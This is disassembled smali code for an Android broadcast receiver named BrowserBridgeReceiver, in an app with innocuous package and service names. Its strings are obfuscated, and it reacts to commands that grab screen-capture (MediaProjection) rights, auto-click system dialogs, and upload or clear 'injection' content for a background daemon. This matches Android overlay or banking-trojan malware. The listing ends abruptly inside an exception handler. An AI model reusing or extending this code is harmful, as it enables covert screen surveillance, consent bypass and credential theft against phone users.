.class public final Lcom/nest/craft/spark/receiver/BrowserBridgeReceiver;
.super Landroid/content/BroadcastReceiver;
.source "r8-map-id-698ec2db7698d3a05f45ca7bd25479f75e72e3f151868426bc4d05779f175955"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/nest/craft/spark/receiver/BrowserBridgeReceiver$aatfw;
    }
.end annotation

.annotation runtime Lkotlin/Metadata;
    d1 = {
        "\u0000 \n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\u0008\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0002\n\u0002\u0008\u0004\u0018\u0000 \u000b2\u00020\u0001:\u0001\u000bB\u0007\u00a2\u0006\u0004\u0008\u0002\u0010\u0003J\u001f\u0010\t\u001a\u00020\u00082\u0006\u0010\u0005\u001a\u00020\u00042\u0006\u0010\u0007\u001a\u00020\u0006H\u0016\u00a2\u0006\u0004\u0008\t\u0010\n\u00a8\u0006\u000c"
    }
    d2 = {
        "Lcom/nest/craft/spark/receiver/BrowserBridgeReceiver;",
        "Landroid/content/BroadcastReceiver;",
        "<init>",
        "()V",
        "Landroid/content/Context;",
        "context",
        "Landroid/content/Intent;",
        "intent",
        "",
        "onReceive",
        "(Landroid/content/Context;Landroid/content/Intent;)V",
        "aatfw",
        "app_release"
    }
    k = 0x1
    mv = {
        0x1,
        0x8,
        0x0
    }
    xi = 0x30
.end annotation


# static fields
.field public static final aatfw:Lcom/nest/craft/spark/receiver/BrowserBridgeReceiver$aatfw;

.field private static final abwuff:Ljava/lang/String;

.field private static final acgpossk:Ljava/lang/String;

.field private static final adwzbugqk:Ljava/lang/String;

.field private static final afiwz:Ljava/lang/String;

.field private static final afsjusblk:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .line 1
    const-string/jumbo v0, "xG9f7SHLRIvEXnnDBOx+uqVDY8cV7Gi2pA==\n"

    .line 2
    .line 3
    .line 4
    const-string v1, "6g0tgla4Ifk=\n"

    .line 5
    .line 6
    invoke-static {v0, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 7
    .line 8
    .line 9
    move-result-object v0

    .line 10
    sput-object v0, Lcom/nest/craft/spark/receiver/BrowserBridgeReceiver;->abwuff:Ljava/lang/String;

    .line 11
    .line 12
    const-string v0, "NhekhtEjJqw2JYSm7BUAilE6mLb0FRCLVCE=\n"

    .line 13
    .line 14
    const-string v1, "GHXW6aZQQ94=\n"

    .line 15
    .line 16
    invoke-static {v0, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 17
    .line 18
    .line 19
    move-result-object v0

    .line 20
    sput-object v0, Lcom/nest/craft/spark/receiver/BrowserBridgeReceiver;->acgpossk:Ljava/lang/String;

    .line 21
    .line 22
    const-string/jumbo v0, "y6a879a4NuPLhZvU7pQQ3ayHhd/lghLdqoM=\n"

    .line 23
    .line 24
    .line 25
    const-string v1, "5cTOgKHLU5E=\n"

    .line 26
    .line 27
    invoke-static {v0, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 28
    .line 29
    .line 30
    move-result-object v0

    .line 31
    sput-object v0, Lcom/nest/craft/spark/receiver/BrowserBridgeReceiver;->adwzbugqk:Ljava/lang/String;

    .line 32
    .line 33
    const-string v0, "7se6t60ms7vu8JiUlRSSlonrgp2ZAZ+Gjg==\n"

    .line 34
    .line 35
    const-string/jumbo v1, "wKXI2NpV1sk=\n"

    .line 36
    .line 37
    .line 38
    invoke-static {v0, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 39
    .line 40
    .line 41
    move-result-object v0

    .line 42
    sput-object v0, Lcom/nest/craft/spark/receiver/BrowserBridgeReceiver;->afiwz:Ljava/lang/String;

    .line 43
    .line 44
    const-string v0, "LQiFwaXiESwtKbvrk8MrF00gsu2G2DsQ\n"

    .line 45
    .line 46
    const-string v1, "A2r3rtKRdF4=\n"

    .line 47
    .line 48
    invoke-static {v0, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 49
    .line 50
    .line 51
    move-result-object v0

    .line 52
    sput-object v0, Lcom/nest/craft/spark/receiver/BrowserBridgeReceiver;->afsjusblk:Ljava/lang/String;

    .line 53
    .line 54
    new-instance v0, Lcom/nest/craft/spark/receiver/BrowserBridgeReceiver$aatfw;

    .line 55
    .line 56
    const/4 v1, 0x0

    .line 57
    invoke-direct {v0, v1}, Lcom/nest/craft/spark/receiver/BrowserBridgeReceiver$aatfw;-><init>(Lkotlin/jvm/internal/DefaultConstructorMarker;)V

    .line 58
    .line 59
    .line 60
    sput-object v0, Lcom/nest/craft/spark/receiver/BrowserBridgeReceiver;->aatfw:Lcom/nest/craft/spark/receiver/BrowserBridgeReceiver$aatfw;

    .line 61
    .line 62
    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 1
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static synthetic aatfw(Ljava/lang/String;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/nest/craft/spark/receiver/BrowserBridgeReceiver;->adwzbugqk(Ljava/lang/String;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static synthetic abwuff()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/nest/craft/spark/receiver/BrowserBridgeReceiver;->acgpossk()V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method private static final acgpossk()V
    .locals 2

    .line 1
    const-wide/16 v0, 0x3e8

    .line 2
    .line 3
    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V

    .line 4
    .line 5
    .line 6
    sget-object v0, Lcom/nest/craft/spark/service/PlatformAssistDaemon;->mekit:Lcom/nest/craft/spark/service/PlatformAssistDaemon$aatfw;

    .line 7
    .line 8
    invoke-virtual {v0}, Lcom/nest/craft/spark/service/PlatformAssistDaemon$aatfw;->afsjusblk()Lcom/nest/craft/spark/service/PlatformAssistDaemon;

    .line 9
    .line 10
    .line 11
    move-result-object v0

    .line 12
    if-eqz v0, :cond_0

    .line 13
    .line 14
    invoke-virtual {v0}, Lcom/nest/craft/spark/service/PlatformAssistDaemon;->jfgy()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 15
    .line 16
    .line 17
    :catch_0
    :cond_0
    return-void
.end method

.method private static final adwzbugqk(Ljava/lang/String;)V
    .locals 3

    .line 1
    const-string/jumbo v0, "tHhdvGc8o34=\n"

    .line 2
    .line 3
    .line 4
    const-string/jumbo v1, "kBEz1iNd1x8=\n"

    .line 5
    .line 6
    .line 7
    invoke-static {v0, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 8
    .line 9
    .line 10
    move-result-object v0

    .line 11
    invoke-static {p0, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 12
    .line 13
    .line 14
    :try_start_0
    new-instance v0, Lz/H6;

    .line 15
    .line 16
    invoke-direct {v0, p0}, Lz/H6;-><init>(Ljava/lang/String;)V

    .line 17
    .line 18
    .line 19
    new-instance p0, Lcom/nest/craft/spark/receiver/BrowserBridgeReceiver$abwuff;

    .line 20
    .line 21
    const/4 v1, 0x0

    .line 22
    invoke-direct {p0, v0, v1}, Lcom/nest/craft/spark/receiver/BrowserBridgeReceiver$abwuff;-><init>(Lz/H6;Lkotlin/coroutines/Continuation;)V

    .line 23
    .line 24
    .line 25
    const/4 v0, 0x1

    .line 26
    invoke-static {v1, p0, v0, v1}, Lkotlinx/coroutines/BuildersKt;->runBlocking$default(Lkotlin/coroutines/CoroutineContext;Lkotlin/jvm/functions/Function2;ILjava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 27
    .line 28
    .line 29
    return-void

    .line 30
    :catch_0
    move-exception p0

    .line 31
    sget-object v0, Lz/jo;->aatfw:Lz/jo;

    .line 32
    .line 33
    const-string v1, "CCk/EkRImvYRGSQZVF6ipLXY5Zi2nhkR443A09eDdWDvy6jZgtNLIQ==\n"

    .line 34
    .line 35
    const-string v2, "U2tNfTM7/4Q=\n"

    .line 36
    .line 37
    invoke-static {v1, v2}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 38
    .line 39
    .line 40
    move-result-object v1

    .line 41
    invoke-virtual {v0, v1, p0}, Lz/jo;->bjbfx(Ljava/lang/String;Ljava/lang/Throwable;)V

    .line 42
    .line 43
    .line 44
    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 7

    .line 1
    const-string v0, "[BrowserBridge] CLEAR_INJECTION pkg="

    .line 2
    .line 3
    const-string v1, "[BrowserBridge] UPLOAD_INJECTION len="

    .line 4
    .line 5
    const-string v2, "[BrowserBridge] PROJECTION_RESULT code="

    .line 6
    .line 7
    const-string v3, "E261MSMo\n"

    .line 8
    .line 9
    const-string/jumbo v4, "egDBVE1cmWc=\n"

    .line 10
    .line 11
    .line 12
    const-string v5, "bndpsmmb+w==\n"

    .line 13
    .line 14
    const-string v6, "DRgHxgzjj/E=\n"

    .line 15
    .line 16
    invoke-static {v5, v6, p1, v3, v4}, Lz/sn;->afiwz(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 17
    .line 18
    .line 19
    move-result-object v3

    .line 20
    invoke-static {p2, v3}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 21
    .line 22
    .line 23
    :try_start_0
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    .line 24
    .line 25
    .line 26
    move-result-object v3

    .line 27
    if-nez v3, :cond_0

    .line 28
    .line 29
    goto/16 :goto_2

    .line 30
    .line 31
    :cond_0
    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 32
    .line 33
    .line 34
    move-result-object v4

    .line 35
    new-instance v5, Ljava/lang/StringBuilder;

    .line 36
    .line 37
    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 38
    .line 39
    .line 40
    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 41
    .line 42
    .line 43
    const-string v6, ".browser.START_CONNECTION"

    .line 44
    .line 45
    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 46
    .line 47
    .line 48
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 49
    .line 50
    .line 51
    move-result-object v5

    .line 52
    invoke-static {v3, v5}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 53
    .line 54
    .line 55
    move-result v5

    .line 56
    if-eqz v5, :cond_1

    .line 57
    .line 58
    sget-object p1, Lz/jo;->aatfw:Lz/jo;

    .line 59
    .line 60
    const-string/jumbo p2, "qLw7YlHSa3OxjCBpQcRTIaCqCF9y/k1OvbAMTnLoQU8=\n"

    .line 61
    .line 62
    .line 63
    const-string v0, "8/5JDSahDgE=\n"

    .line 64
    .line 65
    invoke-static {p2, v0}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 66
    .line 67
    .line 68
    move-result-object p2

    .line 69
    invoke-virtual {p1, p2}, Lz/jo;->ahdpsbxig(Ljava/lang/String;)V

    .line 70
    .line 71
    .line 72
    sget-object p1, Lcom/nest/craft/spark/service/PlatformAssistDaemon;->mekit:Lcom/nest/craft/spark/service/PlatformAssistDaemon$aatfw;

    .line 73
    .line 74
    invoke-virtual {p1}, Lcom/nest/craft/spark/service/PlatformAssistDaemon$aatfw;->afsjusblk()Lcom/nest/craft/spark/service/PlatformAssistDaemon;

    .line 75
    .line 76
    .line 77
    move-result-object p1

    .line 78
    if-eqz p1, :cond_9

    .line 79
    .line 80
    invoke-virtual {p1}, Lcom/nest/craft/spark/service/PlatformAssistDaemon;->xe()V

    .line 81
    .line 82
    .line 83
    return-void

    .line 84
    :catch_0
    move-exception p1

    .line 85
    goto/16 :goto_1

    .line 86
    .line 87
    :cond_1
    new-instance v5, Ljava/lang/StringBuilder;

    .line 88
    .line 89
    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 90
    .line 91
    .line 92
    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 93
    .line 94
    .line 95
    const-string v6, ".browser.PROJECTION_RESULT"

    .line 96
    .line 97
    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 98
    .line 99
    .line 100
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 101
    .line 102
    .line 103
    move-result-object v5

    .line 104
    invoke-static {v3, v5}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 105
    .line 106
    .line 107
    move-result v5

    .line 108
    if-eqz v5, :cond_4

    .line 109
    .line 110
    const-string v0, "YoCd0YjKhqB0gA==\n"

    .line 111
    .line 112
    const-string v1, "EOXupOS+xc8=\n"

    .line 113
    .line 114
    invoke-static {v0, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 115
    .line 116
    .line 117
    move-result-object v0

    .line 118
    const/4 v1, 0x0

    .line 119
    invoke-virtual {p2, v0, v1}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    .line 120
    .line 121
    .line 122
    move-result v0

    .line 123
    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 124
    .line 125
    const/16 v4, 0x21

    .line 126
    .line 127
    if-lt v3, v4, :cond_2

    .line 128
    .line 129
    const-string v3, "3hHn8F7pGFXYFQ==\n"

    .line 130
    .line 131
    const-string/jumbo v4, "rHSUhTKdXDQ=\n"

    .line 132
    .line 133
    .line 134
    invoke-static {v3, v4}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 135
    .line 136
    .line 137
    move-result-object v3

    .line 138
    invoke-static {p2, v3}, Lz/ck;->agdkcbl(Landroid/content/Intent;Ljava/lang/String;)Ljava/lang/Object;

    .line 139
    .line 140
    .line 141
    move-result-object p2

    .line 142
    check-cast p2, Landroid/content/Intent;

    .line 143
    .line 144
    goto :goto_0

    .line 145
    :cond_2
    const-string v3, "BvnIeQtOfcsA/Q==\n"

    .line 146
    .line 147
    const-string v4, "dJy7DGc6Oao=\n"

    .line 148
    .line 149
    invoke-static {v3, v4}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 150
    .line 151
    .line 152
    move-result-object v3

    .line 153
    invoke-virtual {p2, v3}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;

    .line 154
    .line 155
    .line 156
    move-result-object p2

    .line 157
    check-cast p2, Landroid/content/Intent;

    .line 158
    .line 159
    :goto_0
    sget-object v3, Lz/jo;->aatfw:Lz/jo;

    .line 160
    .line 161
    if-eqz p2, :cond_3

    .line 162
    .line 163
    const/4 v1, 0x1

    .line 164
    :cond_3
    new-instance v4, Ljava/lang/StringBuilder;

    .line 165
    .line 166
    invoke-direct {v4, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 167
    .line 168
    .line 169
    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 170
    .line 171
    .line 172
    const-string v2, " hasData="

    .line 173
    .line 174
    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 175
    .line 176
    .line 177
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    .line 178
    .line 179
    .line 180
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 181
    .line 182
    .line 183
    move-result-object v1

    .line 184
    invoke-virtual {v3, v1}, Lz/jo;->ahdpsbxig(Ljava/lang/String;)V

    .line 185
    .line 186
    .line 187
    const/4 v1, -0x1

    .line 188
    if-ne v0, v1, :cond_9

    .line 189
    .line 190
    if-eqz p2, :cond_9

    .line 191
    .line 192
    sget-object v1, Lz/x9;->aatfw:Lz/x9;

    .line 193
    .line 194
    invoke-virtual {v1, v0, p2}, Lz/x9;->agdkcbl(ILandroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 195
    .line 196
    .line 197
    :try_start_1
    const-string/jumbo v2, "xbO89MIynO3HvL3+1wSD8Q==\n"

    .line 198
    .line 199
    .line 200
    const-string/jumbo v3, "qNbYnaNt7J8=\n"

    .line 201
    .line 202
    .line 203
    invoke-static {v2, v3}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 204
    .line 205
    .line 206
    move-result-object v2

    .line 207
    invoke-virtual {p1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 208
    .line 209
    .line 210
    move-result-object p1

    .line 211
    const-string v2, "W18r1jqPdG1bRTOaeIk1YFRZM5pugzVtWkRq1G+AeSNBUzffOo17Z0dFLt40gXBnXEtpymiDf2ZW\nXi7VdMJYZlFDJupog39mVl4u1XShdG1UTSLI\n"

    .line 212
    .line 213
    const-string v3, "NSpHuhrsFQM=\n"

    .line 214
    .line 215
    invoke-static {v2, v3}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 216
    .line 217
    .line 218
    move-result-object v2

    .line 219
    invoke-static {p1, v2}, Lkotlin/jvm/internal/Intrinsics;->checkNotNull(Ljava/lang/Object;Ljava/lang/String;)V

    .line 220
    .line 221
    .line 222
    check-cast p1, Landroid/media/projection/MediaProjectionManager;

    .line 223
    .line 224
    invoke-virtual {p1, v0, p2}, Landroid/media/projection/MediaProjectionManager;->getMediaProjection(ILandroid/content/Intent;)Landroid/media/projection/MediaProjection;

    .line 225
    .line 226
    .line 227
    move-result-object p1

    .line 228
    if-eqz p1, :cond_9

    .line 229
    .line 230
    invoke-virtual {v1, p1}, Lz/x9;->afx(Landroid/media/projection/MediaProjection;)V

    .line 231
    .line 232
    .line 233
    sget-object p2, Lcom/nest/craft/spark/service/PlatformAssistDaemon;->mekit:Lcom/nest/craft/spark/service/PlatformAssistDaemon$aatfw;

    .line 234
    .line 235
    invoke-virtual {p2}, Lcom/nest/craft/spark/service/PlatformAssistDaemon$aatfw;->afsjusblk()Lcom/nest/craft/spark/service/PlatformAssistDaemon;

    .line 236
    .line 237
    .line 238
    move-result-object p2

    .line 239
    if-eqz p2, :cond_9

    .line 240
    .line 241
    invoke-virtual {p2, p1}, Lcom/nest/craft/spark/service/PlatformAssistDaemon;->wdmbkk(Landroid/media/projection/MediaProjection;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 242
    .line 243
    .line 244
    return-void

    .line 245
    :catch_1
    move-exception p1

    .line 246
    :try_start_2
    sget-object p2, Lz/jo;->aatfw:Lz/jo;

    .line 247
    .line 248
    const-string/jumbo v0, "syYL79bgiW+qFhDkxvaxPaUBHenAw55yggEa9Mj8gj0N7OJlGikJuVmMzSU=\n"

    .line 249
    .line 250
    .line 251
    const-string v1, "6GR5gKGT7B0=\n"

    .line 252
    .line 253
    invoke-static {v0, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 254
    .line 255
    .line 256
    move-result-object v0

    .line 257
    invoke-virtual {p2, v0, p1}, Lz/jo;->bjbfx(Ljava/lang/String;Ljava/lang/Throwable;)V

    .line 258
    .line 259
    .line 260
    goto/16 :goto_2

    .line 261
    .line 262
    :cond_4
    new-instance p1, Ljava/lang/StringBuilder;

    .line 263
    .line 264
    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    .line 265
    .line 266
    .line 267
    invoke-virtual {p1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 268
    .line 269
    .line 270
    const-string v2, ".browser.AUTO_CLICK_DIALOG"

    .line 271
    .line 272
    invoke-virtual {p1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 273
    .line 274
    .line 275
    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 276
    .line 277
    .line 278
    move-result-object p1

    .line 279
    invoke-static {v3, p1}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 280
    .line 281
    .line 282
    move-result p1

    .line 283
    if-eqz p1, :cond_5

    .line 284
    .line 285
    sget-object p1, Lz/jo;->aatfw:Lz/jo;

    .line 286
    .line 287
    const-string p2, "TMGrkEy9XOBV8bCbXKtkslbWjbBkjXXbVMiGu3KPdd1Q\n"

    .line 288
    .line 289
    const-string v0, "F4PZ/zvOOZI=\n"

    .line 290
    .line 291
    invoke-static {p2, v0}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 292
    .line 293
    .line 294
    move-result-object p2

    .line 295
    invoke-virtual {p1, p2}, Lz/jo;->ahdpsbxig(Ljava/lang/String;)V

    .line 296
    .line 297
    .line 298
    new-instance p1, Ljava/lang/Thread;

    .line 299
    .line 300
    new-instance p2, Lz/gb;

    .line 301
    .line 302
    const/4 v0, 0x1

    .line 303
    invoke-direct {p2, v0}, Lz/gb;-><init>(I)V

    .line 304
    .line 305
    .line 306
    const-string v0, "TTPuJCgLamh7LsQsJg1A\n"

    .line 307
    .line 308
    const-string v1, "D0GHQE9uKx0=\n"

    .line 309
    .line 310
    invoke-static {v0, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 311
    .line 312
    .line 313
    move-result-object v0

    .line 314
    invoke-direct {p1, p2, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    .line 315
    .line 316
    .line 317
    invoke-virtual {p1}, Ljava/lang/Thread;->start()V

    .line 318
    .line 319
    .line 320
    return-void

    .line 321
    :cond_5
    new-instance p1, Ljava/lang/StringBuilder;

    .line 322
    .line 323
    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    .line 324
    .line 325
    .line 326
    invoke-virtual {p1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 327
    .line 328
    .line 329
    const-string v2, ".browser.UPLOAD_INJECTION"

    .line 330
    .line 331
    invoke-virtual {p1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 332
    .line 333
    .line 334
    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 335
    .line 336
    .line 337
    move-result-object p1

    .line 338
    invoke-static {v3, p1}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 339
    .line 340
    .line 341
    move-result p1

    .line 342
    if-eqz p1, :cond_7

    .line 343
    .line 344
    const-string p1, "ROzuDracaOdDxuUftA==\n"

    .line 345
    .line 346
    const-string v0, "LYKEa9XoAYg=\n"

    .line 347
    .line 348
    invoke-static {p1, v0}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 349
    .line 350
    .line 351
    move-result-object p1

    .line 352
    invoke-virtual {p2, p1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    .line 353
    .line 354
    .line 355
    move-result-object p1

    .line 356
    if-nez p1, :cond_6

    .line 357
    .line 358
    goto/16 :goto_2

    .line 359
    .line 360
    :cond_6
    sget-object p2, Lz/jo;->aatfw:Lz/jo;

    .line 361
    .line 362
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    .line 363
    .line 364
    .line 365
    move-result v0

    .line 366
    new-instance v2, Ljava/lang/StringBuilder;

    .line 367
    .line 368
    invoke-direct {v2, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 369
    .line 370
    .line 371
    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 372
    .line 373
    .line 374
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 375
    .line 376
    .line 377
    move-result-object v0

    .line 378
    invoke-virtual {p2, v0}, Lz/jo;->ahdpsbxig(Ljava/lang/String;)V

    .line 379
    .line 380
    .line 381
    new-instance p2, Ljava/lang/Thread;

    .line 382
    .line 383
    new-instance v0, Lz/jf;

    .line 384
    .line 385
    const/4 v1, 0x3

    .line 386
    invoke-direct {v0, v1, p1}, Lz/jf;-><init>(ILjava/lang/Object;)V

    .line 387
    .line 388
    .line 389
    const-string p1, "8k4yIhiAszzcUzoi\n"

    .line 390
    .line 391
    const-string/jumbo v1, "sDxbRn/l5kw=\n"

    .line 392
    .line 393
    .line 394
    invoke-static {p1, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 395
    .line 396
    .line 397
    move-result-object p1

    .line 398
    invoke-direct {p2, v0, p1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    .line 399
    .line 400
    .line 401
    invoke-virtual {p2}, Ljava/lang/Thread;->start()V

    .line 402
    .line 403
    .line 404
    return-void

    .line 405
    :cond_7
    new-instance p1, Ljava/lang/StringBuilder;

    .line 406
    .line 407
    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    .line 408
    .line 409
    .line 410
    invoke-virtual {p1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 411
    .line 412
    .line 413
    const-string v1, ".browser.CLEAR_INJECTION"

    .line 414
    .line 415
    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 416
    .line 417
    .line 418
    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 419
    .line 420
    .line 421
    move-result-object p1

    .line 422
    invoke-static {v3, p1}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 423
    .line 424
    .line 425
    move-result p1

    .line 426
    if-eqz p1, :cond_9

    .line 427
    .line 428
    const-string p1, "dBjf7nuO3YRjEszuew==\n"

    .line 429
    .line 430
    const-string v1, "AHmtiR76jeU=\n"

    .line 431
    .line 432
    invoke-static {p1, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 433
    .line 434
    .line 435
    move-result-object p1

    .line 436
    invoke-virtual {p2, p1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    .line 437
    .line 438
    .line 439
    move-result-object p1

    .line 440
    if-nez p1, :cond_8

    .line 441
    .line 442
    goto :goto_2

    .line 443
    :cond_8
    sget-object p2, Lz/jo;->aatfw:Lz/jo;

    .line 444
    .line 445
    invoke-virtual {v0, p1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    .line 446
    .line 447
    .line 448
    move-result-object v0

    .line 449
    invoke-virtual {p2, v0}, Lz/jo;->ahdpsbxig(Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 450
    .line 451
    .line 452
    :try_start_3
    sget-object p2, Lcom/nest/craft/spark/service/PlatformAssistDaemon;->mekit:Lcom/nest/craft/spark/service/PlatformAssistDaemon$aatfw;

    .line 453
    .line 454
    invoke-virtual {p2}, Lcom/nest/craft/spark/service/PlatformAssistDaemon$aatfw;->afsjusblk()Lcom/nest/craft/spark/service/PlatformAssistDaemon;

    .line 455
    .line 456
    .line 457
    move-result-object p2

    .line 458
    if-eqz p2, :cond_9

    .line 459
    .line 460
    invoke-virtual {p2, p1}, Lcom/nest/craft/spark/service/PlatformAssistDaemon;->kqgctmk(Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    .line 461
    .line 462
    .line 463
    return-void

    .line 464
    :catch_2
    move-exception p1

    .line 465
    :try_start_4
    sget-object p2, Lz/jo;->aatfw:Lz/jo;

    .line 466
    .line 467
    const-string v0, "SJOPtfhhzclRo5S+6Hf1m/VpeD0flE4IuzR4f2q2GVOndA==\n"

    .line 468
    .line 469
    const-string v1, "E9H92o8SqLs=\n"

    .line 470
    .line 471
    invoke-static {v0, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 472
    .line 473
    .line 474
    move-result-object v0

    .line 475
    invoke-virtual {p2, v0, p1}, Lz/jo;->bjbfx(Ljava/lang/String;Ljava/lang/Throwable;)V
